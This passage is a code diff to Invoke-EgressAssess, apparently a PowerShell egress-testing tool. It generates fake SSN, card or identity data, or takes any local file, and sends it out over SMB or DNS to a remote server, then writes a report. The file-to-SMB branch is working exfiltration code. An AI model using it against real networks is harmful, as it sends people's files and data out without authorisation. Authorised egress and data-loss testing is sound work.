+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    Write-Verbose "[*] You did not provide a data type to generate."
+                    Write-Verbose "[*] DNS file transfers currently not supported."
+                    break
                 }
             }
             else
             {
                 Write-Verbose "[*] You did not provide a data type to generate."
             }
-            Do {
-                try  {
+            Do
+            {
+                try
+                {
                     Write-Verbose "Sending data via DNS..this may take awhile."
                     $ByteReader = 0
                     While ($ByteReader -le ($DNSData.length - 20))
@@ -938,10 +1711,11 @@ function Invoke-EgressAssess
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            Write-Verbose "[*] Transfer complete!"
-            $loops--
-            Write-Verbose "[*] $loops loops remaining.."
-            } While ($loops -gt 0) 
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
         }
         
         function Use-SMB
@@ -956,50 +1730,53 @@ function Invoke-EgressAssess
                 Generate-SSN
                 [string]$SMBData = $AllSSN
             }
-            elseif ($Datatype -eq "identity") {
-                    Generate-Names
-                    [string]$SMBData = $AllNames
-                }
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
+            elseif ($Datatype -eq "identity")
+            {
+                Generate-Identity
+                [string]$SMBData = $AllNames
+            }
+            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+            {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
                 
-                    Write-Verbose "[*] Sending file to egress server.."
+                Write-Verbose "[*] Sending file to egress server.."
+                try
+                {
+                    Copy-Item -Path $Datatype -Destination \\$IP\data
+                    Write-Verbose "[*] File transfer complete."
+                    Break
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, file tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                
+            }
+            # If we're sending faux data, generate the file, send and delete it.
+            Do
+            {
+                try
+                {
+                    $Date = Get-Date -Format Mdyyyy_hhmmss
+                    $Path = "smbdata_" + $Date + ".txt"
+                    $SMBData | Out-File "$env:temp\$Path"
+                    Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
+                    
                     try
                     {
-                        Copy-Item -Path $Datatype -Destination \\$IP\data
-                        Write-Verbose "[*] File transfer complete."
-                        Break
+                        Remove-Item -Path $env:temp\$Path
                     }
                     catch
                     {
                         $ErrorMessage = $_.Exception.Message
-                        Write-Verbose "[*] Error, file tranfer failed with error:"
+                        Write-Verbose "[*] Error, unable to remove temporary file."
                         Write-Verbose $ErrorMessage
                         Break
                     }
-                
-            }
-            # If we're sending faux data, generate the file, send and delete it.
-            Do {
-                try
-                    {
-                        $Date = Get-Date -Format Mdyyyy_hhmmss
-                        $Path = "smbdata_" + $Date + ".txt"
-                        $SMBData | Out-File "$env:temp\$Path"
-                        Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
-                        
-                        try
-                        {
-                            Remove-Item -Path $env:temp\$Path
-                        }
-                        catch
-                        {
-                            $ErrorMessage = $_.Exception.Message
-                            Write-Verbose "[*] Error, unable to remove temporary file."
-                            Write-Verbose $ErrorMessage
-                            Break
-                        }
-                    }
+                }
                 catch
                 {
                     $ErrorMessage = $_.Exception.Message
@@ -1007,12 +1784,13 @@ function Invoke-EgressAssess
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            Write-Verbose "[*] Transfer complete!"
-            $loops--
-            Write-Verbose "[*] $loops loops remaining.."
-            } While ($loops -gt 0)
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
         }
-
+        
         #write report to console and file to C:\Egress-Assess\report.txt
         #future enhancement: add variable input for report path and filename
         #future enhancement: add filename of exfilled file to report
@@ -1022,21 +1800,22 @@ function Invoke-EgressAssess
             Write-Verbose "----------Egress-Assess Report----------"
             Write-Verbose "Report File = $Report"
             $EAreport = [ordered]@{
-                "Server"=$IP
-                "Datatype"=$datatype.toUpper()
-                "Protocol"=$client.toUpper()
-                "Size (MB)"=$Size
-                "Loops"=$loops
-                "Time (seconds)"=[Math]::Round($(($endTime-$startTime).totalseconds),2)
+                "Server" = $IP
+                "Datatype" = $datatype.toUpper()
+                "Protocol" = $client.toUpper()
+                "Size (MB)" = $Size
+                "Loops" = $loops
+                "Time (seconds)" = [Math]::Round($(($endTime - $startTime).totalseconds), 2)
                 "Date" = Get-Date
             }
             try
             {
-                if((Test-Path -path $Report) -eq $False)
+                if ((Test-Path -path $Report) -eq $False)
                 {
                     Write-Verbose "[*] Writing new report file..."
                     $null > $Report
-                } else {}
+                }
+                else { }
                 Write-Output $EAreport | Format-Table | Tee-Object -file $Report -Append
             }
             catch
@@ -1045,64 +1824,68 @@ function Invoke-EgressAssess
                 break
             }
         }
-
     }
     process
     {
-            if (!$NoPing) {
-                Test-ServerConnection
-            }
+        if ($Actor)
+        {
+            Use-Actor $Actor
+        }
+        if (!$NoPing)
+        {
+            Test-ServerConnection
+        }
         
-            if ($client -eq "http" -or $client -eq "https")
-            {
-                Use-HTTP
-            }
-            elseif ($client -eq "ftp")
-            {
-                Use-Ftp
-            }
-            elseif ($client -eq "smtp")
-            {
-                Use-SMTP
-            }
-            elseif ($client -eq "sftp")
-            {
-                Use-SFTP
-            }
-            elseif ($client -eq "icmp")
-            {
-                Use-ICMP
-            }
-            elseif ($client -eq "dnstxt")
-            {
-                Use-DNSTXT
-            }
-            elseif ($client -eq "dnsresolved")
-            {
-                Use-DNSResolved
-            }
-            elseif ($client -eq "smb")
-            {
-                Use-SMB
-            }
-            else
-            {
-                Write-Verbose "[*] You failed to provide a protocol"
-                Return
-            }
-
-            #get end time
-            $endTime = (Get-Date)
-
-            if($Report -gt 0)
-            {
-                Write-Report
-            } else {}
+        if ($client -eq "http" -or $client -eq "https")
+        {
+            Use-HTTP
+        }
+        elseif ($client -eq "ftp")
+        {
+            Use-Ftp
+        }
+        elseif ($client -eq "smtp")
+        {
+            Use-SMTP
+        }
+        elseif ($client -eq "sftp")
+        {
+            Use-SFTP
+        }
+        elseif ($client -eq "icmp")
+        {
+            Use-ICMP
+        }
+        elseif ($client -eq "dnstxt")
+        {
+            Use-DNSTXT
+        }
+        elseif ($client -eq "dnsresolved")
+        {
+            Use-DNSResolved
+        }
+        elseif ($client -eq "smb")
+        {
+            Use-SMB
+        }
+        else
+        {
+            Write-Verbose "[*] You failed to provide a protocol"
+            Return
+        }
+        
+        #get end time
+        $endTime = (Get-Date)
+        
+        if ($Report -gt 0)
+        {
+            Write-Report
+        }
+        else { }
     }
     end
     {
         [System.GC]::Collect()
         Write-Verbose "[*] Exiting.."
     }
-    
 }
